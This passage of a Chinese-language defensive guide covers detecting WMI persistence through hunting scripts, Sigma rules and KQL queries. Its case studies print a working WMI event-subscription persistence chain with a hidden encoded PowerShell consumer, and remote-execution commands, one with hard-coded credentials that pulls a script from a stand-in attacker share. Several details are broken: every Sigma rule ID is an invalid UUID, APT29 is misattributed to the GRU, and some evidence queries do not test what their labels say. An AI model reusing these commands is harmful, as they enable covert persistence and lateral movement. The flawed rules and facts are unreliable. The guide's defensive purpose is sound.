    $_.Message -like "*__EventFilter*" -or
    $_.Message -like "*__EventConsumer*" -or
    $_.Message -like "*__FilterToConsumerBinding*"
} | Sort-Object TimeCreated

$attackPattern | Format-Table TimeCreated, Id, LogName, Message -AutoSize
```

关键认知：WMI 事件日志分析需要综合分析 WMI 活动日志、安全日志和 Sysmon 日志。通过时间线分析可以还原攻击者的行为序列，识别 WMI 远程执行、事件订阅和横向移动等攻击活动。

---

## 0x07 WMI 检测工具链

### WMI 检测命令行工具

**wmic 命令**

```cmd
wmic /namespace:\\root\subscription path __EventFilter get Name,Query
wmic /namespace:\\root\subscription path __EventConsumer get Name,CommandLineTemplate
wmic /namespace:\\root\subscription path __FilterToConsumerBinding get Filter,Consumer
```

**PowerShell Get-WmiObject 命令**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer
```

**PowerShell Get-CimInstance 命令**

```powershell
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Select-Object Name, Query
Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Select-Object Name, CommandLineTemplate
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Select-Object Filter, Consumer
```

### WMI 持久化检测脚本

**完整检测脚本**

```powershell
Write-Host "=== WMI 持久化检测 ===" -ForegroundColor Cyan

Write-Host "`n[1] 检查事件过滤器..." -ForegroundColor Yellow
$filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter
if ($filters) {
    $filters | Format-Table Name, Query, QueryLanguage -AutoSize
    foreach ($filter in $filters) {
        if ($filter.Query -like "*SystemUpTime*" -or $filter.Query -like "*powershell*" -or $filter.Query -like "*cmd.exe*") {
            Write-Host "[!] 可疑事件过滤器: $($filter.Name)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "[+] 未发现事件过滤器" -ForegroundColor Green
}

Write-Host "`n[2] 检查事件消费者..." -ForegroundColor Yellow
$consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer
if ($consumers) {
    $consumers | Format-Table Name, CommandLineTemplate -AutoSize
    foreach ($consumer in $consumers) {
        if ($consumer.CommandLineTemplate -like "*powershell*" -or $consumer.CommandLineTemplate -like "*EncodedCommand*" -or $consumer.CommandLineTemplate -like "*cmd.exe*") {
            Write-Host "[!] 可疑事件消费者: $($consumer.Name)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "[+] 未发现事件消费者" -ForegroundColor Green
}

Write-Host "`n[3] 检查过滤器到消费者的绑定..." -ForegroundColor Yellow
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
if ($bindings) {
    $bindings | Format-Table Filter, Consumer -AutoSize
    foreach ($binding in $bindings) {
        Write-Host "[!] 发现绑定: $($binding.Filter) -> $($binding.Consumer)" -ForegroundColor Red
    }
} else {
    Write-Host "[+] 未发现绑定" -ForegroundColor Green
}

Write-Host "`n[4] 检查 MOF 文件..." -ForegroundColor Yellow
$mofFiles = Get-ChildItem -Path "C:\Windows\System32\wbem\Autorecover\" -Filter "*.mof" -Recurse -ErrorAction SilentlyContinue
if ($mofFiles) {
    $mofFiles | Format-Table Name, LastWriteTime, Length -AutoSize
    foreach ($mof in $mofFiles) {
        Write-Host "[!] 发现 MOF 文件: $($mof.FullName)" -ForegroundColor Red
    }
} else {
    Write-Host "[+] 未发现 MOF 文件" -ForegroundColor Green
}

Write-Host "`n[5] 检查 WMI 活动日志..." -ForegroundColor Yellow
$wmiLogs = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational'; ID=5861} -MaxEvents 10 -ErrorAction SilentlyContinue
if ($wmiLogs) {
    $wmiLogs | Format-Table TimeCreated, Message -AutoSize
    foreach ($log in $wmiLogs) {
        Write-Host "[!] 发现永久事件订阅: $($log.TimeCreated)" -ForegroundColor Red
    }
} else {
    Write-Host "[+] 未发现可疑 WMI 活动" -ForegroundColor Green
}
```

### Sysmon WMI 监控配置

**Sysmon 配置文件**

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256</HashAlgorithms>
  <EventFiltering>
    <RuleGroup name="" groupRelation="or">
      <WmiEvent onmatch="include">
        <Rule name="WMI Event Subscription" groupRelation="or">
          <EventID name="WmiEventFilter" condition="is">19</EventID>
          <EventID name="WmiEventConsumer" condition="is">20</EventID>
          <EventID name="WmiEventConsumerBinding" condition="is">21</EventID>
        </Rule>
      </WmiEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**应用 Sysmon 配置**

```cmd
sysmon.exe -accepteula -i sysmon_config.xml
```

### Sigma 检测规则

**检测 WMI 永久事件订阅**

```yaml
title: WMI Permanent Event Subscription
id: 1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
status: experimental
description: 检测 WMI 永久事件订阅的创建
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1546/003/
tags:
    - attack.persistence
    - attack.t1546.003
logsource:
    product: windows
    service: wmi
detection:
    selection:
        EventID: 5861
    condition: selection
fields:
    - EventTime
    - Namespace
    - FilterName
    - ConsumerName
    - User
falsepositives:
    - Legitimate WMI event subscriptions
level: high
```

**检测 WMI 远程执行**

```yaml
title: WMI Remote Execution
id: 2b3c4d5e-6f7g-8h9i-0j1k-2l3m4n5o6p7q
status: experimental
description: 检测 WMI 远程执行命令
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1047/
tags:
    - attack.execution
    - attack.t1047
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: '\WmiPrvSE.exe'
        Image|endswith: '\powershell.exe'
    condition: selection
fields:
    - EventTime
    - ComputerName
    - User
    - CommandLine
    - ParentCommandLine
falsepositives:
    - Legitimate WMI activity
level: high
```

**检测 MOF 文件编译**

```yaml
title: MOF File Compilation
id: 3c4d5e6f-7g8h-9i0j-1k2l-3m4n5o6p7q8r
status: experimental
description: 检测 MOF 文件编译活动
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1546/003/
tags:
    - attack.persistence
    - attack.t1546.003
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\mofcomp.exe'
    condition: selection
fields:
    - EventTime
    - ComputerName
    - User
    - CommandLine
falsepositives:
    - Legitimate MOF file compilation
level: medium
```

---

## 0x08 证据强度分层

### 确认恶意（Confirmation Level）

以下证据可以确认 WMI 恶意活动：

**证据 1：已知恶意工具创建的 WMI 事件订阅**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "EmpireFilter" -or $_.Name -eq "CobaltStrikeFilter"}
```

**证据 2：执行已知恶意载荷的 WMI 事件消费者**

```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.CommandLineTemplate -like "*Invoke-Mimikatz*" -or $_.CommandLineTemplate -like "*Invoke-Shellcode*"}
```

**证据 3：与已知 APT 组织 TTPs 匹配的 WMI 活动**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational'; ID=5861} | Where-Object {$_.Message -like "*SystemUpTime*" -and $_.Message -like "*240*"}
```

### 高度可疑（High Suspicion Level）

以下证据表明 WMI 活动高度可疑：

**证据 1：非管理员用户创建的 WMI 事件订阅**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query, @{Name="User";Expression={$_.PSComputerName}}
```

**证据 2：执行编码命令的 WMI 事件消费者**

```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.CommandLineTemplate -like "*EncodedCommand*"}
```

**证据 3：异常的 WMI 远程执行**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4648} | Where-Object {$_.Message -like "*WmiPrvSE.exe*" -and $_.Message -like "*192.168.*"}
```

### 需要关注（Attention Level）

以下证据需要进一步关注：

**证据 1：新创建的 WMI 事件订阅**

```powershell
$recentTime = (Get-Date).AddDays(-7)
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.PSComputerName -ne $env:COMPUTERNAME}
```

**证据 2：MOF 文件创建**

```powershell
Get-ChildItem -Path "C:\Windows\System32\wbem\Autorecover\" -Filter "*.mof" -Recurse | Where-Object {$_.LastWriteTime -gt $recentTime}
```

**证据 3：WMI 活动日志中的异常**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational'} -MaxEvents 100 | Where-Object {$_.Message -like "*powershell*" -or $_.Message -like "*cmd.exe*"}
```

关键认知：证据强度分层帮助防御者优先处理最严重的威胁。确认恶意的证据需要立即响应，高度可疑的证据需要深入调查，需要关注的证据需要持续监控。

---

## 0x09 公开案例中的 WMI 持久化

### 案例一：APT29 — WMI 事件订阅持久化

**攻击概述**

APT29（Cozy Bear）是俄罗斯情报总局（GRU）下属的高级持续性威胁组织。在 2020 年的 SolarWinds 供应链攻击中，APT29 使用 WMI 事件订阅实现持久化。

**攻击手法**

APT29 使用 PowerShell 创建永久事件订阅，在系统启动后执行恶意载荷：

```powershell
$filter = @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filter

$consumer = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer

$binding = @{
    Filter = "__EventFilter.Name='WindowsUpdateFilter'"
    Consumer = "CommandLineEventConsumer.Name='WindowsUpdateConsumer'"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $binding
```

**取证发现**

安全研究人员在受害系统的 WMI Repository 中发现了恶意事件订阅，事件过滤器使用系统启动时间作为触发条件，事件消费者执行编码的 PowerShell 命令。

**检测要点**

- 监控 Event ID 5861（永久事件订阅创建）
- 分析 PowerShell 脚本块日志（Event ID 4104）
- 检查 WMI Repository 中的事件订阅

### 案例二：Emotet — WMI 远程执行

**攻击概述**

Emotet 是一种高度模块化的银行木马，也是 2020 年最活跃的恶意软件之一。Emotet 使用 WMI 实现横向移动和持久化。

**攻击手法**

Emotet 使用 WMI 在内部网络中横向移动，使用窃取的凭据通过 WMI 远程执行恶意载荷：

```cmd
wmic /node:192.168.1.100 /user:administrator /password:Password123 process call create "cmd.exe /c powershell -ep bypass -file \\attacker\share\emotet.ps1"
```

**取证发现**

安全研究人员在受害系统的安全日志中发现了大量 Event ID 4648（显式凭据登录）和 Event ID 4688（进程创建），进程树显示 WmiPrvSE.exe 创建了 PowerShell 进程。

**检测要点**

- 监控 Event ID 4648（显式凭据登录）
- 分析进程树，识别 WmiPrvSE.exe 创建的异常进程
- 检查网络日志，识别 DCOM（TCP 135）和 WinRM（TCP 5985/5986）通信

### 案例三：Lazarus — WMI 横向移动

**攻击概述**

Lazarus 是朝鲜下属的高级持续性威胁组织，负责了多次重大网络攻击，包括 2014 年索尼影业攻击和 2017 年 WannaCry 勒索软件攻击。Lazarus 使用 WMI 实现横向移动。

**攻击手法**

Lazarus 使用 WMI 在内部网络中横向移动，使用 PowerShell 脚本通过 WMI 远程执行恶意载荷：

```powershell
$cred = Get-Credential
$session = New-CimSession -ComputerName "192.168.1.100" -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\lazarus.ps1"}
```

**取证发现**

安全研究人员在受害系统的 Sysmon 日志中发现了 Event ID 1（进程创建）和 Event ID 3（网络连接），显示 WmiPrvSE.exe 创建了 PowerShell 进程并建立了网络连接。

**检测要点**

- 监控 Sysmon Event ID 1（进程创建）
- 分析 Sysmon Event ID 3（网络连接）
- 检查 WMI 活动日志（Event ID 5857-5861）

关键认知：WMI 持久化和远程执行是 APT 组织常用的攻击技术。通过分析公开案例可以了解攻击者的 TTPs，提高检测和响应能力。

---

## 0x10 WMI 持久化检测自动化与狩猎

### PowerShell 检测脚本

**完整检测脚本**

```powershell
function Test-WMIPersistence {
    [CmdletBinding()]
    param()
    
    Write-Host "=== WMI 持久化检测 ===" -ForegroundColor Cyan
    Write-Host "检测时间: $(Get-Date)" -ForegroundColor Gray
    Write-Host ""
    
    $results = @()
    
    Write-Host "[1] 检查事件过滤器..." -ForegroundColor Yellow
    $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
    foreach ($filter in $filters) {
        $suspicious = $false
        $reason = ""
        
        if ($filter.Query -like "*SystemUpTime*") {
            $suspicious = $true
            $reason = "使用系统启动时间触发"
        }
        if ($filter.Query -like "*powershell*" -or $filter.Query -like "*cmd.exe*") {
            $suspicious = $true
            $reason = "查询包含可疑命令"
        }
        
        $results += [PSCustomObject]@{
            Type = "EventFilter"
            Name = $filter.Name
            Query = $filter.Query
            Suspicious = $suspicious
            Reason = $reason
        }
        
        if ($suspicious) {
            Write-Host "[!] 可疑事件过滤器: $($filter.Name) - $reason" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[2] 检查事件消费者..." -ForegroundColor Yellow
    $consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
    foreach ($consumer in $consumers) {
        $suspicious = $false
        $reason = ""
        
        if ($consumer.CommandLineTemplate -like "*powershell*" -and $consumer.CommandLineTemplate -like "*EncodedCommand*") {
            $suspicious = $true
            $reason = "执行编码的 PowerShell 命令"
        }
        if ($consumer.CommandLineTemplate -like "*Invoke-Mimikatz*" -or $consumer.CommandLineTemplate -like "*Invoke-Shellcode*") {
            $suspicious = $true
            $reason = "执行已知恶意工具"
        }
        
        $results += [PSCustomObject]@{
            Type = "EventConsumer"
            Name = $consumer.Name
            CommandLine = $consumer.CommandLineTemplate
            Suspicious = $suspicious
            Reason = $reason
        }
        
        if ($suspicious) {
            Write-Host "[!] 可疑事件消费者: $($consumer.Name) - $reason" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[3] 检查过滤器到消费者的绑定..." -ForegroundColor Yellow
    $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
    foreach ($binding in $bindings) {
        $results += [PSCustomObject]@{
            Type = "Binding"
            Filter = $binding.Filter
            Consumer = $binding.Consumer
            Suspicious = $true
            Reason = "发现事件订阅绑定"
        }
        Write-Host "[!] 发现绑定: $($binding.Filter) -> $($binding.Consumer)" -ForegroundColor Red
    }
    
    Write-Host "`n[4] 检查 MOF 文件..." -ForegroundColor Yellow
    $mofFiles = Get-ChildItem -Path "C:\Windows\System32\wbem\Autorecover\" -Filter "*.mof" -Recurse -ErrorAction SilentlyContinue
    foreach ($mof in $mofFiles) {
        $results += [PSCustomObject]@{
            Type = "MOFFile"
            Name = $mof.Name
            Path = $mof.FullName
            LastWriteTime = $mof.LastWriteTime
            Suspicious = $true
            Reason = "发现 MOF 文件"
        }
        Write-Host "[!] 发现 MOF 文件: $($mof.FullName)" -ForegroundColor Red
    }
    
    Write-Host "`n[5] 检查 WMI 活动日志..." -ForegroundColor Yellow
    $wmiLogs = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational'; ID=5861} -MaxEvents 50 -ErrorAction SilentlyContinue
    foreach ($log in $wmiLogs) {
        $results += [PSCustomObject]@{
            Type = "WMILog"
            TimeCreated = $log.TimeCreated
            Message = $log.Message
            Suspicious = $true
            Reason = "发现永久事件订阅日志"
        }
        Write-Host "[!] 发现永久事件订阅: $($log.TimeCreated)" -ForegroundColor Red
    }
    
    Write-Host "`n=== 检测结果汇总 ===" -ForegroundColor Cyan
    $suspiciousCount = ($results | Where-Object {$_.Suspicious -eq $true}).Count
    if ($suspiciousCount -gt 0) {
        Write-Host "[!] 发现 $suspiciousCount 个可疑项" -ForegroundColor Red
        $results | Where-Object {$_.Suspicious -eq $true} | Format-Table Type, Name, Reason -AutoSize
    } else {
        Write-Host "[+] 未发现可疑 WMI 持久化" -ForegroundColor Green
    }
    
    return $results
}

Test-WMIPersistence
```

### 事件日志狩猎查询（SQL）

**使用 KQL 查询 WMI 活动**

```kusto
SecurityEvent
| where EventID in (4648, 4688)
| where ProcessName contains "WmiPrvSE.exe" or ProcessCommandLine contains "WmiPrvSE.exe"
| summarize count() by Computer, Account, EventID, bin(TimeGenerated, 1h)
| render timechart
```

**使用 KQL 查询 WMI 事件订阅**

```kusto
MicrosoftWindowsWMActivity
| where EventID == 5861
| project TimeGenerated, Computer, Namespace, FilterName, ConsumerName, User
| order by TimeGenerated desc
```

**使用 KQL 查询 MOF 文件编译**

```kusto
SecurityEvent
| where EventID == 4688
| where ProcessName contains "mofcomp.exe"
| project TimeGenerated, Computer, Account, ProcessCommandLine
| order by TimeGenerated desc
```

### Sigma 检测规则

**检测 WMI 事件订阅创建**

```yaml
title: WMI Event Subscription Creation
id: 4d5e6f7g-8h9i-0j1k-2l3m-4n5o6p7q8r9s
status: experimental
description: 检测 WMI 事件订阅的创建
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1546/003/
tags:
    - attack.persistence
    - attack.privilege_escalation
    - attack.t1546.003
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - "__EventFilter"
            - "__EventConsumer"
            - "__FilterToConsumerBinding"
    condition: selection
fields:
    - EventTime
    - ComputerName
    - User
    - ScriptBlockText
falsepositives:
    - Legitimate WMI event subscriptions
level: high
```

**检测 WMI 横向移动**

```yaml
title: WMI Lateral Movement
id: 5e6f7g8h-9i0j-1k2l-3m4n-5o6p7q8r9s0t
status: experimental
description: 检测 WMI 横向移动活动
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1047/
tags:
    - attack.lateral_movement
    - attack.execution
    - attack.t1047
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4648
        ProcessName|contains: "WmiPrvSE.exe"
    filter:
        TargetServerName|contains: "localhost"
    condition: selection and not filter
fields:
    - EventTime
    - ComputerName
    - SubjectUserName
    - TargetServerName
    - TargetUserName
falsepositives:
    - Legitimate WMI remote management
level: high
```

**检测 WMI 持久化组合**

```yaml
title: WMI Persistence Combination
id: 6f7g8h9i-0j1k-2l3m-4n5o-6p7q8r9s0t1u
status: experimental
description: 检测 WMI 持久化的组合活动
author: Security Team
date: 2026/06/24
references:
    - https://attack.mitre.org/techniques/T1546/003/
tags:
    - attack.persistence
    - attack.t1546.003
logsource:
    product: windows
    service: wmi
detection:
    selection1:
        EventID: 5861
        Namespace: "root\\subscription"
    selection2:
        FilterName|contains: "Filter"
        ConsumerName|contains: "Consumer"
    condition: selection1 and selection2
fields:
    - EventTime
    - Namespace
    - FilterName
    - ConsumerName
    - User
falsepositives:
    - Legitimate WMI event subscriptions
level: critical
```

---

## 0x11 参考资料

1. Microsoft. "Windows Management Instrumentation (WMI) Overview." Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page

2. MITRE ATT&CK. "Windows Management Instrumentation Event Subscription (T1546.003)." https://attack.mitre.org/techniques/T1546/003/

3. MITRE ATT&CK. "Windows Management Instrumentation (T1047)." https://attack.mitre.org/techniques/T1047/

4. FireEye. "APT29: A New Threat to U.S. Critical Infrastructure." FireEye Blog. https://www.fireeye.com/blog/threat-research/2020/12/apt29-targets-us-critical-infrastructure.html

5. CrowdStrike. "Emotet: The Most Prolific Malware of 2020." CrowdStrike Blog. https://www.crowdstrike.com/blog/emotet-most-prolific-malware-2020/

6. SecureWorks. "Lazarus Group: North Korea's Cyber Threat Actor." SecureWorks Counter Threat Unit. https://www.secureworks.com/research/lazarus-group

7. SANS Institute. "WMI Persistence and Detection." SANS Reading Room. https://www.sans.org/reading-room/whitepapers/detection/wmi-persistence-detection-39660

8. BlackHat. "WMI Attacks and Defense." BlackHat Briefings. https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent-Asynchronous-And-Fileless-Backdoor.pdf

9. Microsoft. "Sysmon WMI Event Monitoring." Microsoft Docs. https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

10. SigmaHQ. "Sigma Rules for WMI Detection." SigmaHQ GitHub Repository. https://github.com/SigmaHQ/sigma
